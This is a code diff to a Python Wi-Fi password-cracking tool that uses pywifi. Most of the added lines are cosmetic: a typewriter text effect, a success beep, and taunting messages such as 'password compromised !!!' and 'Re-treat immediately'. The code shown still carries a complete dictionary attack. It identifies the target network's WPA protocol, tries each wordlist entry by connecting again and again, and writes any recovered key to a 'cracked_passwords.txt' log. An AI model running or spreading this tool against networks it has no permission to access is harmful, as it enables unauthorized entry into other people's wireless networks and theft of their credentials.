@@ -5,7 +5,28 @@ import sys
 import os
 from colorama import Fore, Back, Style, init
 
+# Initialize Colorama
 init(autoreset=True)
+
+def alert_beep():
+    """Triggers a success sound alert."""
+    try:
+        if os.name == 'nt':
+            import winsound
+            winsound.Beep(1000, 500)  # Frequency: 1000Hz, Duration: 500ms
+        else:
+            sys.stdout.write('\a') 
+            sys.stdout.flush()
+    except:
+        pass
+
+def typewriter(text, color_style, speed=0.04):
+    """Creates the slow-typing effect for dramatic updates."""
+    for char in text:
+        sys.stdout.write(color_style + char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
 
 def show_banner():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -22,20 +43,17 @@ def show_banner():
     print(f"{Fore.CYAN}{'='*75}\n")
 
 def get_protocol_details(iface, target_ssid):
-    """Scans and detects network security protocols (WPA, WPA2, WPA3)."""
     iface.scan()
+    typewriter("[*] Identifying target protocol...", Fore.YELLOW, 0.03)
     time.sleep(3)
     results = iface.scan_results()
     for network in results:
         if network.ssid == target_ssid:
             akm = network.akm
-            # Detect WPA3 (often requires specific hardware support in pywifi/drivers)
             if hasattr(const, 'AKM_TYPE_SAE') and const.AKM_TYPE_SAE in akm:
                 return "WPA3 (SAE)", const.AKM_TYPE_SAE
-            # Detect WPA2
             if const.AKM_TYPE_WPA2PSK in akm:
                 return "WPA2-PSK", const.AKM_TYPE_WPA2PSK
-            # Detect WPA
             if const.AKM_TYPE_WPAPSK in akm:
                 return "WPA-PSK", const.AKM_TYPE_WPAPSK
     return "UNKNOWN/WPA2", const.AKM_TYPE_WPA2PSK
@@ -43,18 +61,15 @@ def get_protocol_details(iface, target_ssid):
 def test_wifi(iface, ssid, password, timeout, akm_type):
     iface.disconnect()
     time.sleep(0.5)
-    
     profile = pywifi.Profile()
     profile.ssid = ssid
     profile.auth = const.AUTH_ALG_OPEN
     profile.akm.append(akm_type)
     profile.cipher = const.CIPHER_TYPE_CCMP
     profile.key = password
-
     iface.remove_all_network_profiles()
     tmp_profile = iface.add_network_profile(profile)
     iface.connect(tmp_profile)
-
     start_time = time.time()
     while time.time() - start_time < timeout:
         if iface.status() == const.IFACE_CONNECTED:
@@ -76,39 +91,46 @@ def main():
         iface = wifi.interfaces()[0] 
 
         if not os.path.exists(wordlist_path):
-            print(f"\n{Fore.RED}[!] WORDLIST NOT FOUND")
+            typewriter(f"\n{Fore.RED}[!] CRITICAL ERROR: WORDLIST NOT FOUND", Fore.RED, 0.05)
             return
 
-        print(f"\n{Fore.YELLOW}[*] Identifying protocol for {ssid}...")
         proto_name, akm_type = get_protocol_details(iface, ssid)
-        print(f"{Fore.GREEN}[+] Detected: {Fore.WHITE}{proto_name}")
+        typewriter(f"[+] Protocol Detected: {proto_name}", Fore.GREEN, 0.03)
 
         with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
 
         total = len(passwords)
-        print(f"{Fore.GREEN}[+] Starting injection. Rules: Skip all < 8 chars.")
+        typewriter(f"[+] Injecting {total} keys. Skipping all < 8 digits...", Fore.GREEN, 0.02)
+        print("") 
 
         for i, pwd in enumerate(passwords, 1):
-            # Strict Length Rule for WPA/WPA2/WPA3
             if len(pwd) < 8:
-                sys.stdout.write(f"\r{Fore.RED}skipping (short) {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
+                sys.stdout.write(f"\r{Fore.RED}skipping (short) {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}{' '*15}")
                 sys.stdout.flush()
                 continue
 
-            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
+            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}{' '*15}")
             sys.stdout.flush()
 
             if test_wifi(iface, ssid, pwd, delay, akm_type):
-                print(f"\n\n{Fore.GREEN}{Style.BRIGHT}Success! Password: {pwd}")
+                # SUCCESS SEQUENCE WITH FULL TYPEWRITER EFFECT
+                alert_beep()
+                print("\n")
+                typewriter(f"Success! :({pwd})", Fore.GREEN + Style.BRIGHT, 0.06)
+                typewriter("password compromised !!!", Fore.RED + Style.BRIGHT, 0.08)
+                typewriter("Re-treat immediately", Fore.RED + Style.BRIGHT, 0.08)
+                
                 with open("cracked_passwords.txt", "a") as log:
                     log.write(f"DATE: {time.ctime()} | SSID: {ssid} | KEY: {pwd}\n")
                 return
             
-        print(f"\n\n{Fore.RED}[!] Scan complete. No matches found.")
+        print("\n")
+        typewriter("[!] Wordlist exhausted. Target remains secure.", Fore.RED, 0.05)
 
     except KeyboardInterrupt:
-        print(f"\n\n{Fore.RED}{Style.BRIGHT}It's not me!{Style.RESET_ALL}")
+        print("\n")
+        typewriter("It's not me!", Fore.RED + Style.BRIGHT, 0.08)
         sys.exit()
 
 if __name__ == "__main__":
